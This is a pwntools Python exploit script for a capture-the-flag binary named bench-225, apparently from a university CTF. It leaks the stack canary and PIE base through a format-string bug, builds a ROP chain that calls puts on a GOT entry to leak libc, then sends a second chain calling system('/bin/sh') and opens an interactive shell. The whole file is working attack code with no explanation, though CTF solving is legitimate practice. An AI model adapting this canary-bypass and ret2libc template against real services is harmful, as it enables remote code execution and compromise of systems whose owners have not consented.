#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' bench-225
from pwn import *
import subprocess

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'source/bench-225_patched')
libc = ELF("source/libc.so.6")
rop = libc
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'bench-225.ctf.umasscybersec.org'
port = int(args.PORT or 1337)
context.timeout=2.0

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *motivation+814
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def solve():            

    def get_motivation():
        for _ in range(int(315/45)):
            io.sendline(b"3")
            io.clean()
        for _ in range(5):
            io.sendline(b"4")
            io.clean()

    def fuzz():
        for i in range(1, 12):
            io.sendline(b"6")
            io.clean()
            io.sendline(f"%{i}$p".encode())
            io.recvuntil(b"Quote: \"")
            recv = io.recvline().strip()
            # print(hexdump(recv))
            recv = int(recv, 16) if b"nil" not in recv else 0x0  
            log.info(f"index-{i} -> {hex(recv)}")

    def leak(idx):
        io.sendline(b"6")
        io.clean()
        io.sendline(f"%{idx}$p".encode())
        io.recvuntil(b"Quote: \"")
        recv = io.recvline().strip()
        recv = int(recv, 16) if b"nil" not in recv else 0x0  
        return recv

    def leak_libc(canary, func_name):
        io.sendline(b"6")
        io.clean()

        p = (b"A"*8)
        p+= p64(canary)
        p+= p64(0x1)
        p+= p64(POP_RDI) + p64(exe.got[func_name]) + p64(exe.plt["puts"]) + p64(exe.sym["motivation"])

        io.sendline(p)
        io.recvuntil(b"........................%%@%%@@*#@%@%@%#%###*%%##**##%##*#%%*##*##***#%#@%**#%@@*#%%%**++==+-==-----")
        io.recvline()
        recv = io.recvline()
        recv = u64(recv[:6].ljust(8, b"\x00"))

        log.success(f"{func_name}@got -> {hex(recv)}")  
        return recv

    def send_payload(_p):
        io.sendline(b"6")
        io.clean()
        p = (b"A"*8)
        p+= p64(canary)
        p+= p64(0x1)
        p+= _p
        io.sendline(p)

    io = start()
    get_motivation()
    # fuzz()

    offset=9
    canary = leak(offset)
    log.success(f"canary -> {hex(canary)}")
    offset=11
    exe.address = leak(offset) - (exe.sym["main"] + 837)
    log.success(f"exe -> {hex(exe.address)}")


    POP_RDI = exe.address + 0x0000000000001336

    # leak_libc(canary, "puts")
    # leak_libc(canary, "__stack_chk_fail")
    # leak_libc(canary, "exit")
    libc.address = leak_libc(canary, "getchar") - libc.sym["getchar"]
    log.success(f"libc addr @ {hex(libc.address)}")

    BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
    SYSTEM = libc.sym["system"]
    EXIT = libc.sym["exit"]
    rop = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM+27) + p64(EXIT)
    send_payload(rop)

    io.interactive()

if __name__ == "__main__":
    solve()

